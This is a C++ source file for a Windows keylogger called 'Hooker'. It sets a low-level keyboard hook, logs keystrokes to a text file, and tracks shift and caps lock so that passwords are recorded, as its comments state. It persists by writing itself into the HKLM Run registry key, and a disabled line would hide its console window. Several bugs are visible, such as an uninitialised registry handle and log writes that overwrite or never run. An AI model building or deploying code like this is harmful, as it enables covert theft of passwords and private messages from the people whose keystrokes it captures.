
#include<Windows.h>
#include "HookerHead.h"
#pragma comment(lib,"user32.lib")
using namespace std;
string str = "";
const string logFileName = "HookerLogs.txt";
static bool capsLockPressed = false;
static bool isShiftPress = false;
ofstream outStream;
int fileOpenMode = (int)ios_base::app; //open existing file. Do not overide it !
const int maxAllowedStringLenght = 50;
HHOOK hHook = NULL;
const int bufferSize = 300;

int main(){
	
	//Hide the console window and make it run at background 
	//If you execute the .exe file stop the process manualy
	//ShowWindow(GetConsoleWindow(), SW_HIDE);
	
	AddProgramInHKEY_LOCAL_MACHINERegister();
	//Open the file stream 
	//Define the keyboard hook
	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, HoockCallback, NULL, 0);
	if (hHook == NULL) {
	}
	//Infinite loop to keep the programe live and wait for keyboard event
	while (GetMessage(NULL,NULL,0,0))
	{

	}
	outStream.open(logFileName,fileOpenMode);
	outStream << str;
	outStream.close();

	return 0;
}
LRESULT CALLBACK HoockCallback(int nCode, WPARAM wParam, LPARAM lParam) {
	KBDLLHOOKSTRUCT cKey = *((KBDLLHOOKSTRUCT *)lParam);
	if (wParam == WM_KEYDOWN) {
		//We are interest in case when shft key is pressed and hold !
		if (cKey.vkCode == VK_LSHIFT || cKey.vkCode == VK_RSHIFT) {
			isShiftPress = true; // UpperCase 
		}
		return CallNextHookEx(hHook, nCode, wParam, lParam);
	}
	
	//Defining a buffer in the callback
	//Get the keyboard state 
	BYTE keyboard_state[bufferSize];
	GetKeyboardState(keyboard_state);
	UpdateKeyState(keyboard_state, VK_SHIFT);
	UpdateKeyState(keyboard_state, VK_CONTROL);
	UpdateKeyState(keyboard_state, VK_MENU);
	HKL keyboardLayout = GetKeyboardLayout(0);
	char lpszName[255] = { 0 };
	DWORD dwMsg = 1;
	dwMsg += cKey.scanCode << 16;
	dwMsg += cKey.flags << 24;
	int i = GetKeyNameText(dwMsg, (LPTSTR)lpszName, bufferSize);
	ProcessEvent(lpszName, cKey.vkCode, str, wParam, outStream);
	return CallNextHookEx(hHook, nCode, wParam, lParam);
}

//This method update the given key state
void UpdateKeyState(BYTE *keystate, int keyCode) {
	keystate[keyCode] = GetKeyState(keyCode); // getin the state of the key
}

void ProcessEvent(char* lpszName,int codeNum, string& str, WPARAM wParam,ofstream &outputSteam) {
	// we need to record the input in more meaningfull format than just chars
	//if enter is pressed, we can asume that a message or input data are send somewhere - website email chatbox
	//end we record that 
	switch (codeNum)
	{
	case 20 : //we need to have key sensitiv hook in order to have valid logs for password for example
		if (capsLockPressed == true) {
			capsLockPressed = false;
		}
		else {
			capsLockPressed = true;
		}
		break;
	case 32: str += " "; // add emty string 
		break;
	case 13: //Enter
		//Write to the file. Later this will be changed, but for now on enter press write new line		
		outStream.open(logFileName);
		outStream <<str;
		outStream << "\r\n";
		outStream.close();
		break;
	case 8: //Backspace
		//remove the last char of str
		str[str.size() - 1] = NULL;
		break;
	case 9 :
		str += " "; // Tab. Very often used by user when the go form one input field to other
		break;
	case 160: //shift is released
		isShiftPress = false;
		break;
	default: 
		if (isShiftPress == false && capsLockPressed == false) {
			// then the symbol is lower case 
			str += tolower(*lpszName);
		}
		else {
			str += lpszName;
		}
			
		break;
	}
}
//Administrative access is required in order to execute this fuction
//If the current logged user is Administrator this will add the Hooker.exe
//in the registers, so the logger will star on reboot
//If this is successfull then the Hooker.exe will need only one manual start form the user
//then he will infect the windows registers
void AddProgramInHKEY_LOCAL_MACHINERegister() {
	TCHAR szPath[MAX_PATH];
	GetModuleFileName(NULL, szPath, MAX_PATH);
	HKEY newValue;
	RegOpenKey(newValue, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &newValue); 
	//To delete this you need to go in the register and manualy delete the Hooker key
	RegSetValueEx(newValue, "Hoocker", 0, REG_SZ, (LPBYTE)szPath, sizeof(szPath));
	LSTATUS st = RegCloseKey(newValue); // Need to be fixed!
}